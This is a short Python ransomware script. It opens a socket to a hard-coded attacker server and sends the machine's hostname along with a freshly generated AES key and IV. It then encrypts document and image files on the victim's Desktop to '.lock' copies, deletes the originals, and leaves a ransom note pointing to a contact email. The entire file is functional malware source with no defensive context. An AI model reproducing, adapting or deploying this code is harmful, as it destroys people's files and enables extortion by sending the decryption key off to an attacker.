import os
import socket
import random
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES

# Filename to notify the victim
FILE_INFO = "INFORMATINOS.txt"
# hacker's mail address to be contacted by the victim
MAIL = "evil@badmail.com"

# Hacker's server ip or domain name
HOST = "192.168.1.40"
# The port to use for the hacker's server
PORT = 8888

# The list of file extension to encrypt
EXTENSIONS = ['doc', 'docx', 'gif', 'jpeg', 'jpg', 'pdf', 'png', 'txt']


def string_generator(size=16):
    string = ""
    choice = ""
    choice += "abcdefghiklmnopqrstvxyz"
    choice += "ABCDEFGHIKLMNOPQRSTVXYZ"
    choice += "0123456789"
    for i in range(0, 16):
        string += random.choice(choice)
    return string


# Connect to the hacker server
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect((HOST, PORT))

# Generate the key and iv to be used for encryption and send them to the hacker
iv = string_generator(16)
key = string_generator(16)  # use 16 for AES128 and 32 for AES256
victim_info = "name : {name}\r\niv : {iv}\r\nkey : {key}\r\n".format(name=socket.getfqdn(), iv=iv, key=key)
connection.send(victim_info.encode("utf-8"))
iv = iv.encode("utf-8")
key = key.encode("utf-8")

# Move to the correct directory and get list of files
local_directory = os.environ["homepath"] + "\\Desktop"
os.chdir(local_directory)
filename_list = os.listdir(local_directory)

for filename in filename_list:
    # Check whether the file should be encrypt
    if filename.split(".")[-1] in EXTENSIONS:
        # If yes
        # Open the file and create le corresponding ".lock" file
        file_original = open(filename, "rb")
        file_encrypt = open(filename + ".lock", "wb")
        # Read data from the file, encrypt them and write then into the ".lock" file
        data = file_original.read()
        cipher = AES.new(key, AES.MODE_CFB, iv=iv)
        data_encrypt = cipher.encrypt(data)
        file_encrypt.write(data_encrypt)
        # Close files and delete the original file
        file_original.close()
        file_encrypt.close()
        os.remove(filename)

# Create the information file to notify the victim
file = open(FILE_INFO, "at")
file.write("Your data have been encrypted. Please send a mail to {} to know how to discover the process".format(MAIL))
file.close()
